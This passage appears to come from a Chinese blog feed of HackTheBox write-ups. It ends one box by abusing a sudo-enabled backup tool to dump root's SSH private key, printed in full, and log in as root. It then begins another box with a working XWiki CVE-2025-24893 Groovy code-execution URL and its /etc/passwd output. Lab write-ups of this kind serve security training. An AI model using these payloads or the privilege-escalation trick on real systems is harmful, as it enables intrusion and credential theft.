RESTORE_INCLUDES</span><br><span class="line">                        Restore only paths within include path, comma separated list accepted</span><br><span class="line">  --snapshot-id SNAPSHOT_ID</span><br><span class="line">                        Choose <span class="built_in">which</span> snapshot to use. Defaults to latest</span><br><span class="line">  --json                Run <span class="keyword">in</span> JSON API mode. Nothing <span class="keyword">else</span> than JSON will be printed to stdout</span><br><span class="line">  --stdin               Backup using data from stdin input</span><br><span class="line">  --stdin-filename STDIN_FILENAME</span><br><span class="line">                        Alternate filename <span class="keyword">for</span> stdin, defaults to <span class="string">&#x27;stdin.data&#x27;</span></span><br><span class="line">  -v, --verbose         Show verbose output</span><br><span class="line">  -V, --version         Show program version</span><br><span class="line">  --dry-run             Run operations <span class="keyword">in</span> <span class="built_in">test</span> mode, no actual modifications</span><br><span class="line">  --no-cache            Run operations without cache</span><br><span class="line">  --license             Show license</span><br><span class="line">  --auto-upgrade        Auto upgrade NPBackup</span><br><span class="line">  --log-file LOG_FILE   Optional path <span class="keyword">for</span> logfile</span><br><span class="line">  --show-config         Show full inherited configuration <span class="keyword">for</span> current repo. Optionally you can <span class="built_in">set</span> NPBACKUP_MANAGER_PASSWORD <span class="built_in">env</span> variable <span class="keyword">for</span> more details.</span><br><span class="line">  --external-backend-binary EXTERNAL_BACKEND_BINARY</span><br><span class="line">                        Full path to alternative external backend binary</span><br><span class="line">  --group-operation GROUP_OPERATION</span><br><span class="line">                        Deprecated <span class="built_in">command</span> to launch operations on multiple repositories. Not needed anymore. Replaced by --repo-name x,y or --repo-group x,y</span><br><span class="line">  --create-key CREATE_KEY</span><br><span class="line">                        Create a new encryption key, requires a file path</span><br><span class="line">  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK</span><br><span class="line">                        Create a scheduled backup task, specify an argument interval via interval=minutes, or hour=hour,minute=minute <span class="keyword">for</span> a daily task</span><br><span class="line">  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK</span><br><span class="line">                        Create a scheduled housekeeping task, specify hour=hour,minute=minute <span class="keyword">for</span> a daily task</span><br><span class="line">  --check-config-file   Check <span class="keyword">if</span> config file is valid</span><br></pre></td></tr></table></figure>

<p>首先要 <code>-c</code> 来指定 <code>config</code> 文件，否则没法使用。刚好在 <code>marco</code> 的家目录下就有 <code>npbackup.conf</code> ，可以直接用。</p>
<p>看到上述的详细信息里面，<code>--dump</code> 选项似乎可以直接查看文件，我们看看有没有 <code>/root/.ssh/id_rsa</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">marco@codeparttwo:~$ <span class="built_in">sudo</span> /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/.ssh/id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy</span><br><span class="line">VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d</span><br><span class="line">EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q</span><br><span class="line">kiXtMQ5nyiO2E4gQAvXQt9bkMOI1UXqq+IhUBoLJOwxoDwuJyqMKEDGBgMoC2E7dNmxwJV</span><br><span class="line">XQSdbdtrqmtCZJmPhsAT678v4bLUjARk9bnl34/zSXTkUnH+bGKn1hJQ+IG95PZ/rusjcJ</span><br><span class="line">hNzr/GTaAntxsAZEvWr7hZF/56LXncDxS0yLa5YVS8YsEHerd/SBt1m5KCAPGofMrnxSSS</span><br><span class="line">pyuYSlw/OnTT8bzoAY1jDXlr5WugxJz8WZJ3ItpUeBi4YSP2Rmrc29SdKKqzryr7AEn4sb</span><br><span class="line">JJ0y4l95ERARsMPFFbiEyw5MGG3ni61Xw62T3BTlAAAFiCA2JBMgNiQTAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAPWqTY42tv77g1eGmlYXl5y2wnu3SQSP5eC4XNJ0AORfcBhcZLyBMlV0XqeDfro8</span><br><span class="line">WClX3E9x2WEej7Kl5DqyG/fc8K9RpBHgCD3c+zjdKcBGBcbBx5wa/qzwKfXRGjOzjqI6Lt</span><br><span class="line">SiUzZ9BEys78aGHpcojJF/a1bWhE1zbbEnsGFI+HKintZf8OPjHopQXRT+6pIl7TEOZ8oj</span><br><span class="line">thOIEAL10LfW5DDiNVF6qviIVAaCyTsMaA8LicqjChAxgYDKAthO3TZscCVV0EnW3ba6pr</span><br><span class="line">QmSZj4bAE+u/L+Gy1IwEZPW55d+P80l05FJx/mxip9YSUPiBveT2f67rI3CYTc6/xk2gJ7</span><br><span class="line">cbAGRL1q+4WRf+ei153A8UtMi2uWFUvGLBB3q3f0gbdZuSggDxqHzK58UkkqcrmEpcPzp0</span><br><span class="line">0/G86AGNYw15a+VroMSc/FmSdyLaVHgYuGEj9kZq3NvUnSiqs68q+wBJ+LGySdMuJfeREQ</span><br><span class="line">EbDDxRW4hMsOTBht54utV8Otk9wU5QAAAAMBAAEAAAGBAJYX9ASEp2/IaWnLgnZBOc901g</span><br><span class="line">RSallQNcoDuiqW14iwSsOHh8CoSwFs9Pvx2jac8dxoouEjFQZCbtdehb/a3D2nDqJ/Bfgp</span><br><span class="line">4b8ySYdnkL+5yIO0F2noEFvG7EwU8qZN+UJivAQMHT04Sq0yJ9kqTnxaOPAYYpOOwwyzDn</span><br><span class="line">zjW99Efw9DDjq6KWqCdEFbclOGn/ilFXMYcw9MnEz4n5e/akM4FvlK6/qZMOZiHLxRofLi</span><br><span class="line">1J0Elq5oyJg2NwJh6jUQkOLitt0KjuuYPr3sRMY98QCHcZvzUMmJ/hPZIZAQFtJEtXHkt5</span><br><span class="line">UkQ9SgC/LEaLU2tPDr3L+JlrY1Hgn6iJlD0ugOxn3fb924P2y0Xhar56g1NchpNe1kZw7g</span><br><span class="line">prSiC8F2ustRvWmMPCCjS/3QSziYVpM2uEVdW04N702SJGkhJLEpVxHWszYbQpDatq5ckb</span><br><span class="line">SaprgELr/XWWFjz3FR4BNI/ZbdFf8+bVGTVf2IvoTqe6Db0aUGrnOJccgJdlKR8e2nwQAA</span><br><span class="line">AMEA79NxcGx+wnl11qfgc1dw25Olzc6+Jflkvyd4cI5WMKvwIHLOwNQwviWkNrCFmTihHJ</span><br><span class="line">gtfeE73oFRdMV2SDKmup17VzbE47x50m0ykT09KOdAbwxBK7W3A99JDckPBlqXe0x6TG65</span><br><span class="line">UotCk9hWibrl2nXTufZ1F3XGQu1LlQuj8SHyijdzutNQkEteKo374/AB1t2XZIENWzUZNx</span><br><span class="line">vP8QwKQche2EN1GQQS6mGWTxN5YTGXjp9jFOc0EvAgwXczKxJ1AAAAwQD7/hrQJpgftkVP</span><br><span class="line">/K8GeKcY4gUcfoNAPe4ybg5EHYIF8vlSSm7qy/MtZTh2Iowkt3LDUkVXcEdbKm/bpyZWre</span><br><span class="line">0P6Fri6CWoBXmOKgejBdptb+Ue+Mznu8DgPDWFXXVkgZOCk/1pfAKBxEH4+sOYOr8o9SnI</span><br><span class="line">nSXtKgYHFyGzCl20nAyfiYokTwX3AYDEo0wLrVPAeO59nQSroH1WzvFvhhabs0JkqsjGLf</span><br><span class="line">kMV0RRqCVfcmReEI8S47F/JBg/eOTsWfUAAADBAPmScFCNisrgb1dvow0vdWKavtHyvoHz</span><br><span class="line">bzXsCCCHB9Y+33yrL4fsaBfLHoexvdPX0Ssl/uFCilc1zEvk30EeC1yoG3H0Nsu+R57BBI</span><br><span class="line">o85/zCvGKm/BYjoldz23CSOFrssSlEZUppA6JJkEovEaR3LW7b1pBIMu52f+64cUNgSWtH</span><br><span class="line">kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/</span><br><span class="line">MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>还真有，那就拿这个 <code>id_rsa</code> 去 <strong>ssh</strong> 登录就好了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ <span class="built_in">cat</span> id_rsa             </span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy</span><br><span class="line">VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d</span><br><span class="line">EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q</span><br><span class="line">kiXtMQ5nyiO2E4gQAvXQt9bkMOI1UXqq+IhUBoLJOwxoDwuJyqMKEDGBgMoC2E7dNmxwJV</span><br><span class="line">XQSdbdtrqmtCZJmPhsAT678v4bLUjARk9bnl34/zSXTkUnH+bGKn1hJQ+IG95PZ/rusjcJ</span><br><span class="line">hNzr/GTaAntxsAZEvWr7hZF/56LXncDxS0yLa5YVS8YsEHerd/SBt1m5KCAPGofMrnxSSS</span><br><span class="line">pyuYSlw/OnTT8bzoAY1jDXlr5WugxJz8WZJ3ItpUeBi4YSP2Rmrc29SdKKqzryr7AEn4sb</span><br><span class="line">JJ0y4l95ERARsMPFFbiEyw5MGG3ni61Xw62T3BTlAAAFiCA2JBMgNiQTAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAPWqTY42tv77g1eGmlYXl5y2wnu3SQSP5eC4XNJ0AORfcBhcZLyBMlV0XqeDfro8</span><br><span class="line">WClX3E9x2WEej7Kl5DqyG/fc8K9RpBHgCD3c+zjdKcBGBcbBx5wa/qzwKfXRGjOzjqI6Lt</span><br><span class="line">SiUzZ9BEys78aGHpcojJF/a1bWhE1zbbEnsGFI+HKintZf8OPjHopQXRT+6pIl7TEOZ8oj</span><br><span class="line">thOIEAL10LfW5DDiNVF6qviIVAaCyTsMaA8LicqjChAxgYDKAthO3TZscCVV0EnW3ba6pr</span><br><span class="line">QmSZj4bAE+u/L+Gy1IwEZPW55d+P80l05FJx/mxip9YSUPiBveT2f67rI3CYTc6/xk2gJ7</span><br><span class="line">cbAGRL1q+4WRf+ei153A8UtMi2uWFUvGLBB3q3f0gbdZuSggDxqHzK58UkkqcrmEpcPzp0</span><br><span class="line">0/G86AGNYw15a+VroMSc/FmSdyLaVHgYuGEj9kZq3NvUnSiqs68q+wBJ+LGySdMuJfeREQ</span><br><span class="line">EbDDxRW4hMsOTBht54utV8Otk9wU5QAAAAMBAAEAAAGBAJYX9ASEp2/IaWnLgnZBOc901g</span><br><span class="line">RSallQNcoDuiqW14iwSsOHh8CoSwFs9Pvx2jac8dxoouEjFQZCbtdehb/a3D2nDqJ/Bfgp</span><br><span class="line">4b8ySYdnkL+5yIO0F2noEFvG7EwU8qZN+UJivAQMHT04Sq0yJ9kqTnxaOPAYYpOOwwyzDn</span><br><span class="line">zjW99Efw9DDjq6KWqCdEFbclOGn/ilFXMYcw9MnEz4n5e/akM4FvlK6/qZMOZiHLxRofLi</span><br><span class="line">1J0Elq5oyJg2NwJh6jUQkOLitt0KjuuYPr3sRMY98QCHcZvzUMmJ/hPZIZAQFtJEtXHkt5</span><br><span class="line">UkQ9SgC/LEaLU2tPDr3L+JlrY1Hgn6iJlD0ugOxn3fb924P2y0Xhar56g1NchpNe1kZw7g</span><br><span class="line">prSiC8F2ustRvWmMPCCjS/3QSziYVpM2uEVdW04N702SJGkhJLEpVxHWszYbQpDatq5ckb</span><br><span class="line">SaprgELr/XWWFjz3FR4BNI/ZbdFf8+bVGTVf2IvoTqe6Db0aUGrnOJccgJdlKR8e2nwQAA</span><br><span class="line">AMEA79NxcGx+wnl11qfgc1dw25Olzc6+Jflkvyd4cI5WMKvwIHLOwNQwviWkNrCFmTihHJ</span><br><span class="line">gtfeE73oFRdMV2SDKmup17VzbE47x50m0ykT09KOdAbwxBK7W3A99JDckPBlqXe0x6TG65</span><br><span class="line">UotCk9hWibrl2nXTufZ1F3XGQu1LlQuj8SHyijdzutNQkEteKo374/AB1t2XZIENWzUZNx</span><br><span class="line">vP8QwKQche2EN1GQQS6mGWTxN5YTGXjp9jFOc0EvAgwXczKxJ1AAAAwQD7/hrQJpgftkVP</span><br><span class="line">/K8GeKcY4gUcfoNAPe4ybg5EHYIF8vlSSm7qy/MtZTh2Iowkt3LDUkVXcEdbKm/bpyZWre</span><br><span class="line">0P6Fri6CWoBXmOKgejBdptb+Ue+Mznu8DgPDWFXXVkgZOCk/1pfAKBxEH4+sOYOr8o9SnI</span><br><span class="line">nSXtKgYHFyGzCl20nAyfiYokTwX3AYDEo0wLrVPAeO59nQSroH1WzvFvhhabs0JkqsjGLf</span><br><span class="line">kMV0RRqCVfcmReEI8S47F/JBg/eOTsWfUAAADBAPmScFCNisrgb1dvow0vdWKavtHyvoHz</span><br><span class="line">bzXsCCCHB9Y+33yrL4fsaBfLHoexvdPX0Ssl/uFCilc1zEvk30EeC1yoG3H0Nsu+R57BBI</span><br><span class="line">o85/zCvGKm/BYjoldz23CSOFrssSlEZUppA6JJkEovEaR3LW7b1pBIMu52f+64cUNgSWtH</span><br><span class="line">kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/</span><br><span class="line">MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ <span class="built_in">chmod</span> 600 id_rsa   </span><br><span class="line">                                                                                                                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/HTB/codetwo]</span><br><span class="line">└─$ ssh root@10.10.11.82 -i id_rsa</span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line"> System information as of Thu 04 Sep 2025 07:58:37 AM UTC</span><br><span class="line"></span><br><span class="line">  System load:           0.02</span><br><span class="line">  Usage of /:            57.2% of 5.08GB</span><br><span class="line">  Memory usage:          25%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             244</span><br><span class="line">  Users logged <span class="keyword">in</span>:       2</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: 10.10.11.82</span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::250:56ff:feb9:c568</span><br><span class="line"></span><br><span class="line">  =&gt; There are 3 zombie processes.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Infrastructure is not enabled.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Enable ESM Infra to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: <span class="built_in">sudo</span> pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: <span class="built_in">sudo</span> apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@codeparttwo:~# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@codeparttwo:~#</span><br></pre></td></tr></table></figure>

<p>拿到 <code>root flag</code> :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@codeparttwo:~# <span class="built_in">ls</span></span><br><span class="line">root.txt  scripts</span><br><span class="line">root@codeparttwo:~# <span class="built_in">cat</span> root.txt</span><br><span class="line">af2108a1c2ce50acc2db4263c16cfaa8</span><br><span class="line">root@codeparttwo:~#</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>HackTheBox</tag>
        <tag>js2py</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Editor</title>
    <url>/2025/08/18/HackTheBox-Editor/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/editor]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- --min-rate 10000 10.10.11.80 -oA ports</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 09:19 CST</span><br><span class="line">Warning: 10.10.11.80 giving up on port because retransmission <span class="built_in">cap</span> hit (10).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> editor.htb (10.10.11.80)</span><br><span class="line">Host is up (5.7s latency).</span><br><span class="line">Not shown: 45867 closed tcp ports (reset), 19665 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 93.52 seconds</span><br></pre></td></tr></table></figure>

<h2 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h2><p>先访问 80 端口，发现被重定向到了 <code>editor.htb</code> 这个域名，因此把 <strong>editor.htb</strong> 加入到 <code>hosts</code> 文件里，然后访问:</p>
<p><img src="image1.webp" alt="image1"></p>
<p>在 web 主页面里面，有个叫 <code>Documentation</code> 的链接，对应的是 <code>wiki.editor.htb</code> 这个域名，也加入到 <code>hosts</code> 文件里，然后看看是什么内容：</p>
<p><img src="image2.webp" alt="image2"></p>
<p>发现是个 <code>xwiki</code>，而且上面有版本号，因而想到会不会是这个版本的 xwiki 有什么漏洞，所以就去搜了一下。</p>
<p>搜出来发现 <code>xwiki</code> 有个可以远程代码执行的 <strong>CVE</strong>，是 <code>CVE-2025-24893</code>，我们的这个版本 <code>15.10.8</code> 刚好在受影响的版本里面:</p>
<p><img src="image3.webp" alt="image3"></p>
<p>通过下面的这个 <strong>payload</strong>，可以简单验证一下这个漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d</span><br></pre></td></tr></table></figure>

<p>用 curl 验证一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -s  <span class="string">&#x27;http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d&#x27;</span>  | lynx -stdin -dump </span><br><span class="line">   &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">   &lt;rss xmlns:dc=<span class="string">&quot;[1]http://purl.org/dc/elements/1.1/&quot;</span> version=<span class="string">&quot;2.0&quot;</span>&gt;</span><br><span class="line">     &lt;channel&gt;</span><br><span class="line">       &lt;title&gt;RSS feed <span class="keyword">for</span> search on [&#125;&#125;&#125;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">   bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">   sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">   <span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">   games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">   irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">   gnats:x:41:41:Gnats Bug-Reporting System</span><br><span class="line">   (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">   _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">   systemd-network:x:101:102:systemd Network</span><br><span class="line">   Management[,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">   systemd-resolve:x:102:103:systemd</span><br><span class="line">   Resolver],:/run/systemd:/usr/sbin/nologin</span><br><span class="line">   messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">   systemd-timesync:x:104:105:systemd Time</span><br><span class="line">   Synchronization[,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">   pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class="line">   sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">   syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class="line">   uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">   tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">   tss:x:110:116:TPM software stack],:/var/lib/tpm:/bin/false</span><br><span class="line">   landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">   fwupd-refresh:x:112:118:fwupd-refresh</span><br><span class="line">   user[,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">   usbmux:x:113:46:usbmux daemon],:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">   lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">   dnsmasq:x:114:65534:dnsmasq[,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">   mysql:x:115:121:MySQL Server],:/nonexistent:/bin/false</span><br><span class="line">   tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin</span><br><span class="line">   xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin</span><br><span class="line">   netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin</span><br><span class="line">   oliver:x:1000:1000:[,:/home/oliver:/bin/bash</span><br><span class="line">   _laurel:x:995:995::/var/log/laurel:/bin/false]]&lt;/title&gt;</span><br><span class="line">       &lt;<span class="built_in">link</span>&gt;[2]http://wiki.editor.htb:80/xwiki/bin/view/Main/SolrSearch?t</span><br><span class="line">   ext=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln</span><br><span class="line">   %28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%</span><br><span class="line">   7D%7B%7B%2Fasync%7D%7D&lt;/link&gt;</span><br><span class="line">       &lt;description&gt;RSS feed <span class="keyword">for</span> search on</span><br><span class="line">   [&#125;&#125;&#125;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">   bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">   sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">   <span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">   games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">   irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">   gnats:x:41:41:Gnats Bug-Reporting System</span><br><span class="line">   (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">   _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">   systemd-network:x:101:102:systemd Network</span><br><span class="line">   Management[,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">   systemd-resolve:x:102:103:systemd</span><br><span class="line">   Resolver],:/run/systemd:/usr/sbin/nologin</span><br><span class="line">   messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">   systemd-timesync:x:104:105:systemd Time</span><br><span class="line">   Synchronization[,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">   pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class="line">   sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">   syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class="line">   uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">   tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">   tss:x:110:116:TPM software stack],:/var/lib/tpm:/bin/false</span><br><span class="line">   landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">   fwupd-refresh:x:112:118:fwupd-refresh</span><br><span class="line">   user[,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">   usbmux:x:113:46:usbmux daemon],:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">   lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">   dnsmasq:x:114:65534:dnsmasq[,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">   mysql:x:115:121:MySQL Server],:/nonexistent:/bin/false</span><br><span class="line">   tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin</span><br><span class="line">   xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin</span><br><span class="line">   netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin</span><br><span class="line">   oliver:x:1000:1000:[,:/home/oliver:/bin/bash</span><br><span class="line">   _laurel:x:995:995::/var/log/laurel:/bin/false]]&lt;/description&gt;</span><br><span class="line">       &lt;language&gt;en&lt;/language&gt;</span><br><span class="line">       &lt;copyright /&gt;</span><br><span class="line">       &lt;dc:creator&gt;XWiki&lt;/dc:creator&gt;</span><br><span class="line">       &lt;dc:language&gt;en&lt;/dc:language&gt;</span><br><span class="line">       &lt;dc:rights /&gt;</span><br><span class="line">     &lt;/channel&gt;</span><br><span class="line">   &lt;/rss&gt;</span><br><span class="line"></span><br><span class="line">References</span><br><span class="line"></span><br><span class="line">   1. http://purl.org/dc/elements/1.1/</span><br><span class="line">   2. http://wiki.editor.htb/xwiki/bin/view/Main/SolrSearch?text=&#125;&#125;&#125;&#123;&#123;async async=<span class="literal">false</span>&#125;&#125;&#123;&#123;groovy&#125;&#125;println(<span class="string">&quot;cat /etc/passwd&quot;</span>.execute().text)&#123;&#123;/groovy&#125;&#125;&#123;&#123;/async&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到中间是返回了 <code>/etc/passwd</code> 的内容的，说明这个漏洞有效。</p>
<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>我们可以把刚才的 <strong>payload</strong> 里的代码执行的部分，换成我们自己的反弹 shell ，这样应该就可以弹 shell 回来了。</p>
<p>尝试了 <strong>nc、bash、SOCAT、msfvenom</strong> 等弹 shell 方法，都没有成功，最后用 <code>busybox nc</code> 反弹成功了：</p>
